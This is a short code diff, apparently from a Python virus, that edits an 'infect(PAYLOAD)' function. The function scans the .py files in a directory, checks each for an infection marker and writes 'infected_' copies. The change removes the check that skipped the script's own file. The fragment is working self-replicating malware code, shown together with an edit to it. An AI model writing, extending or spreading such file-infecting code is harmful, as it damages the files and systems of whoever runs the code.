@@ -25,8 +25,6 @@ def watermark():
 def infect(PAYLOAD):
     i = 0
     for file in glob.glob("*.py"):
-        if file == __file__:
-            continue
         f = open(file, "r")
         if f.mode == 'r' and not re.search('^#### t45r6fye',f.read()):
             infected = open('infected_'+str(i)+'.py','w')
